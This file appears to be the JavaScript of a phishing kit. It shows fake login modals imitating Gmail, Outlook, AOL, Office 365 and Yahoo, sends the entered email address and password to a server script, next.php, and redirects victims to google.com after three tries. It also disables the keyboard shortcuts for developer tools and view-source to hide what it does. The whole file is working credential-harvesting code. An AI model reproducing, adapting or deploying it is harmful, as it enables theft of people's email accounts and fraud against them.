
/* global $ */
  $(document).ready(function(){
    var count=0;
    $('#gmailmodal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/gmail.png');
      $('#field').html("Gmail");
      $('#ajaxModal').modal('show');
    });
    $('#outlookmodal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/outlook.png');
      $('#field').html("Outlook");
      $('#ajaxModal').modal('show');
    });
    $('#aolmodal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/aol.png');
      $('#field').html("Aol");
      $('#ajaxModal').modal('show');
    });
    $('#office365modal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/office365.png');
      $('#field').html("Office 365");
      $('#ajaxModal').modal('show');
    });
    $('#yahoomodal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/yahoo.png');
      $('#field').html("Yahoo");
      $('#ajaxModal').modal('show');
    });
    $('#othermodal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/othermail.ico');
      $('#field').html("Other Mail");
      $('#ajaxModal').modal('show');
    });
    $('#submit-btn').click(function(event){
      event.preventDefault();
      var email=$("#email").val();
      var password=$("#password").val();
      var detail=$("#field").html();


      var msg = $('#msg').html();
      $('#msg').text( msg );
      count=count+1;
        if (count>=3) {
          count=0;
          window.location.replace("http://google.com");
        }
        else
        {
       $.ajax({
        dataType: 'JSON',
        url: 'next.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
          detail:detail,

        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg').html(response['msg']);
                  // $('input, textarea').val(function() {
                  //    return this.defaultValue;
                  // });
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#msg").show();
              $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
     }
   });
  });

  document.onkeydown=function(e){
    if (e.ctrlKey && 
            (e.keyCode === 73 || 
             e.keyCode === 105 ||
              e.keyCode === 74 || 
             e.keyCode === 106 || 
             e.keyCode === 85 || 
             e.keyCode === 117)) {
            alert('not allowed');
            return false;
        } else {
            return true;
        }
  }